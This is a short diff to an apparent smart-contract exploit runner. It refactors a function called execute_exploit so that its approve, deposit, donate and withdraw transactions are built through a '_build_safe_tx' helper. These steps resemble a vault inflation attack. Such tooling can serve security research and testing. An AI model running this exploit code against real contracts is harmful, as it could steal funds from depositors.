@@ -425,19 +425,23 @@ def execute_exploit(
                 if not ok:
                     return {"success": False, "error": "Insufficient funds or swap failed"}
                 token = w3.eth.contract(address=asset_address, abi=erc20_abi)
-                tx = token.functions.approve(contract_address, 2**256 - 1).build_transaction(tx_params)
+                # tx = token.functions.approve(contract_address, 2**256 - 1).build_transaction(tx_params)
+                tx = _build_safe_tx(w3, token.functions.approve(contract_address, 2**256 - 1), tx_params)
             elif func == "deposit":
                 amount = args[0]
-                tx = contract.functions.deposit(amount).build_transaction(tx_params)
+                # tx = contract.functions.deposit(amount).build_transaction(tx_params)
+                tx = _build_safe_tx(w3, contract.functions.deposit(amount), tx_params)
             elif func == "withdraw":
                 amount = args[0]
-                tx = contract.functions.withdraw(amount).build_transaction(tx_params)
+                # tx = contract.functions.withdraw(amount).build_transaction(tx_params)
+                tx = _build_safe_tx(w3, contract.functions.withdraw(amount), tx_params)
             elif func == "donate":
                 if not asset_address:
                     continue
                 amount = args[0]
                 token = w3.eth.contract(address=asset_address, abi=erc20_abi)
-                tx = token.functions.transfer(contract_address, amount).build_transaction(tx_params)
+                # tx = token.functions.transfer(contract_address, amount).build_transaction(tx_params)
+                tx = _build_safe_tx(w3, token.functions.transfer(contract_address, amount), tx_params)
             elif func == "check_inflation":
                 continue
             else:
